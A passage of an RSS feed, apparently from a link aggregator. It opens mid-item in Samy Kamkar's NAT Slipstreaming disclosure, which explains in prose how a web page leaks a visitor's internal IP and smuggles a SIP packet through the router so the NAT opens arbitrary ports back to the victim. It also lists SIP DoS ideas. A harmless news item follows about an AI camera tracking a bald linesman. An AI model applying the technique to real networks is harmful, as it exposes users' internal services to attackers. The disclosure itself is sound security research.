&lt;p&gt;On some browsers (Chrome, Firefox), we can use &lt;a target=&quot;_blank&quot; href=&quot;https://www.w3.org/TR/webrtc/&quot;&gt;WebRTC&lt;/a&gt; to grab the victim's internal IP address via &lt;a target=&quot;_blank&quot; href=&quot;https://tools.ietf.org/html/rfc5245&quot;&gt;ICE&lt;/a&gt; (which just use STUN/TURN/TURNS). These are protocols for helping peers behind NATs determine information about themselves. Ironically, no server needs to be used in the ICE &quot;request&quot; as the browser already knows its internal IP, and a remote STUN/TURN server wouldn’t know it anyway unless the client sent it in the first place. The problem is not all browsers provide this mechanism.&lt;/p&gt;
&lt;p&gt;As of today, using WebRTC to get the local IP address on Chrome, rather than a &lt;code&gt;.local&lt;/code&gt; mDNS/Bonjour address, requires using HTTPS, but HTTP is necessary for the rest of the attacks, so we first detect if we're on HTTP and if not, rdirect to HTTPS. We then attempt to use WebRTC to extract the local IP address. Either way, we then redirect back to HTTP with the IP(s) appended to the URL to bypass cross-origin restrictions via other communication methods.&lt;/p&gt;
&lt;h3 id=&quot;timing-attack&quot;&gt;Timing Attack&lt;/h3&gt;
&lt;p&gt;If using Safari, IE &amp;lt;= 11, or others that don't support WebRTC or intentionally don’t reveal internal IP (Safari), we can use a web timing attack to reveal the victim’s internal IP address.&lt;/p&gt;
&lt;p&gt;We manage this by first producing hidden HTML &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tags on the page, all to common gateways (192.168.*.1, 10.0.0.1, and &lt;a href=&quot;https://github.com/samyk/slipstream/blob/main/server#L159&quot;&gt;others&lt;/a&gt;), along with Javascript &lt;code&gt;onsuccess&lt;/code&gt; and &lt;code&gt;onerror&lt;/code&gt; events. Each time an img is written to the page, a timer is started and if the &lt;code&gt;onsuccess&lt;/code&gt; loads, that means the IP responded with a web server, and if no web server is running but the IP is on the network, it will send a TCP RST (reset, meaning port not open) back, triggering the &lt;code&gt;onerror&lt;/code&gt;. If no IP exists, no RST is sent and the response will take &amp;gt; 1 second, at which point we know the IP doesn't exist on our network.&lt;/p&gt;
&lt;p&gt;Once we see one of these events trigger, we know a potential internal subnet we're on, then we perform the same attack for every IP on the subnet (eg, 192.168.0.[2-255]), and this time perform a more precise timing to determine which IP responds &lt;strong&gt;fastest&lt;/strong&gt;. This is most likely our own (victim) internal IP, as we don’t even need to leave the network interface. Even if we aren’t first for some reason, we still attempt our attack on all IPs that responded on the network.&lt;/p&gt;
&lt;h2 id=&quot;browser-protocol-confusion&quot;&gt;Browser Protocol Confusion&lt;/h2&gt;
&lt;p&gt;Once the client gets the packet sizes and internal IP address, it constructs a specially crafted web form that pads the POST data up until we believe the packet will become fragmented, at which point our SIP REGISTER containing internal IP address is appended. The form is submitted via Javascript with no consent from the victim. :)&lt;/p&gt;
&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://raw.githubusercontent.com/samyk/slipstream/main/img/pinpkt.png&quot;&gt;&lt;img src=&quot;https://raw.githubusercontent.com/samyk/slipstream/main/img/pinpkt.png&quot; alt=&quot;successful packet broken into valid SIP packet&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;live-browser-packet-alteration&quot;&gt;Live Browser Packet Alteration&lt;/h3&gt;
&lt;p&gt;On our attack server, because we can see the packets come in, we look to see if the SIP packet was rewritten with the public IP address. If it wasn't, we communicate back the client (automatically) that the SIP packet was not on the expected packet boundary and not rewritten, and we provide the new boundary position from our sniffer.&lt;/p&gt;
&lt;p&gt;The client code automatically adjusts its packet size to the new size only after two failures in a row. Some browsers (Firefox) will sometimes have a slightly different packet size due to the multipart-boundary they generate for the form, which unlike most other browsers, is not a fixed length. I find after about 10 tries, the same size will be used and the attack will succeed.&lt;/p&gt;
&lt;p&gt;Once the SIP packet lands on the packet boundary, the NAT will be deceived, believing this is a legitimate SIP registration and from a SIP client on the victim's machine. Once our server responds with a proper SIP response (nested inside of a proper HTTP response to allow the browser to not detect anything fishy), the NAT will open up the port in the original packet we had the victim send and the router will now &lt;strong&gt;forward any port the attacker chooses back to the internal victim, all from simply browsing to a website&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Attack complete. Attacker can now connect to arbitrary TCP/UDP services running on victim.&lt;/p&gt;

&lt;p&gt;These are not used in this attack, but are interesting nonetheless and could potentially be used for other attacks.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;IP fragmentation allows full control of all data in the IP data section, meaning full control of a UDP header including source/dest ports in the overflowed packet
&lt;ul&gt;&lt;li&gt;victim IP stack reassembles and won't parse the data, however the NAT that the packet flows through will be susceptible&lt;/li&gt;
&lt;li&gt;allows bypassing browser or system firewall as only UDP port that's inspected is the original packet, not the overflowed fragmented packet&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;DoS a SIP client by sending &lt;code&gt;Expires: 0&lt;/code&gt; and removing conntrack for someone else&lt;/li&gt;
&lt;li&gt;If a port is already taken, port listened to is incremented until port overflows to 0&lt;/li&gt;
&lt;li&gt;STUN does not have authentication implemented in any modern browser&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Thanks for reading! You can download the PoC code from my &lt;a target=&quot;_blank&quot; href=&quot;https://github.com/samyk/slipstream&quot;&gt;NAT Slipstream github&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Point of Contact:&lt;/strong&gt; &lt;a target=&quot;_blank&quot; href=&quot;https://twitter.com/samykamkar&quot;&gt;@SamyKamkar&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Find more of my projects at &lt;a target=&quot;_blank&quot; href=&quot;https://samy.pl&quot;&gt;https://samy.pl&lt;/a&gt; or potentially reach me at &lt;a href=&quot;mailto:code@samy.pl&quot;&gt;code@samy.pl&lt;/a&gt;.&lt;/p&gt;
&lt;/body&gt;</description>
<pubDate>Sat, 31 Oct 2020 22:57:28 +0000</pubDate>
<dc:creator>todsacerdoti</dc:creator>
<og:title>Samy Kamkar - NAT Slipstreaming</og:title>
<og:description>exploit NAT/firewalls to access TCP/UDP services bound on a victim machine</og:description>
<og:image>http://samy.pl/slipstream/img/slipstreambl.png</og:image>
<og:url>http://samy.pl/slipstream/</og:url>
<dc:format>text/html</dc:format>
<dc:identifier>https://samy.pl/slipstream/</dc:identifier>
</item>
<item>
<title>AI Camera Ruins Soccer Game After Mistaking Referee&amp;#039;s Bald Head for Ball</title>
<link>https://www.iflscience.com/technology/ai-camera-ruins-soccar-game-for-fans-after-mistaking-referees-bald-head-for-ball</link>
<guid isPermaLink="true" >https://www.iflscience.com/technology/ai-camera-ruins-soccar-game-for-fans-after-mistaking-referees-bald-head-for-ball</guid>
<description>&lt;p&gt;Technology and sports have a fairly mixed relationship already. Log on to Twitter during a soccer match (or football as it's properly known*) and as well as people tweeting ambiguous statements like &quot;YESSS&quot; and &quot;oh no mate&quot; to about 20,000 inexplicable retweets, you'll likely see a lot of complaints about the video assistant referee (VAR) and occasionally goal-line technology not doing its job.&lt;/p&gt;
&lt;p&gt;Fans of Scottish football team Inverness Caledonian Thistle FC experienced a new hilarious technological glitch during a match last weekend, but in all honesty, you'd be hard-pressed to say it didn't improve the viewing experience dramatically. &lt;/p&gt;
&lt;p&gt;The club announced a few weeks ago it was moving from using human camera operators to cameras controlled by AI. The &lt;a href=&quot;https://ictfc.com/icttv-live-streaming-from-caledonian-stadium&quot;&gt;club proudly announced&lt;/a&gt; at the time the new &quot;Pixellot system uses cameras with in-built, AI, ball-tracking technology&quot; and would be used to capture HD footage of all home matches at Caledonian Stadium, which would be broadcast directly to season-ticket holders' homes.&lt;/p&gt;
&lt;p&gt;Cut to last Saturday, when the robot cameras were given a new challenge that hadn't been foreseen: A linesman with a bald head.&lt;/p&gt;
&lt;p&gt;-&lt;/p&gt;
&lt;p&gt;The AI camera appeared to mistake the man's bald head for the ball for a lot of the match, repeatedly swinging back to follow the linesman instead of the actual game. Many viewers &lt;a href=&quot;https://twitter.com/skayr100/status/1320861821243371522&quot;&gt;complained&lt;/a&gt; they missed their team scoring a goal because the camera &quot;kept thinking the Lino bald head was the ball,&quot; and some even suggested the club would have to provide the linesman with a toupe or hat.&lt;/p&gt;
&lt;p&gt;With no fans allowed in the stadium due to Covid-19 restrictions, the fans of Inverness Caledonian Thistle FC and their opponents Ayr United could only watch via the cameras, and so were treated to mostly a view of the linesman's head instead of any exciting moments of the match that were occurring off-camera, though some fans saw this as a bonus given the usual quality of performance.&lt;/p&gt;
&lt;p&gt;&lt;iframe src=&quot;//www.youtube.com/embed/9zoJP2FkpgU&quot; width=&quot;560&quot; height=&quot;315&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;allowfullscreen&quot;&gt;[embedded content]&lt;/iframe&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;sup&gt;Sound on.&lt;/sup&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;As you can see from the highlight reel above, the AI-operated camera continuously follows the linesman's head, particularly struggling as the ball falls down towards the ground near him. You can practically hear its thought process: &quot;ball ball ball bald head, there's a bald head, zoom in on the bald head.&quot;&lt;/p&gt;
&lt;p&gt;The object recognition technology could clearly do with a bit of a tweak, or else the team might actually have to implement the policy of bald referees being forced to wear a sombrero to differentiate themselves from the ball.&lt;/p&gt;

&lt;p&gt;*It may surprise you to know IFLScience is based in the UK, not the US. &lt;/p&gt;
</description>
<pubDate>Sat, 31 Oct 2020 22:17:16 +0000</pubDate>
<dc:creator>alexcnwy</dc:creator>
<og:title>AI Camera Ruins Soccer Game For Fans After Mistaking Referee's Bald Head For Ball</og:title>
<og:type>article</og:type>
<og:url>https://www.iflscience.com/technology/ai-camera-ruins-soccar-game-for-fans-after-mistaking-referees-bald-head-for-ball/</og:url>
<og:description>Technology and sports have a fairly mixed relationship already. Log on to Twitter during a soccer match (or football as it's properly known*) and as well a</og:description>
<og:image>https://cdn.iflscience.com/images/011d50c8-2fdd-5e0c-b11f-9072f1a95689/default-1603975163-cover-image.jpg</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.iflscience.com/technology/ai-camera-ruins-soccar-game-for-fans-after-mistaking-referees-bald-head-for-ball/</dc:identifier>
</item>
</channel>
</rss>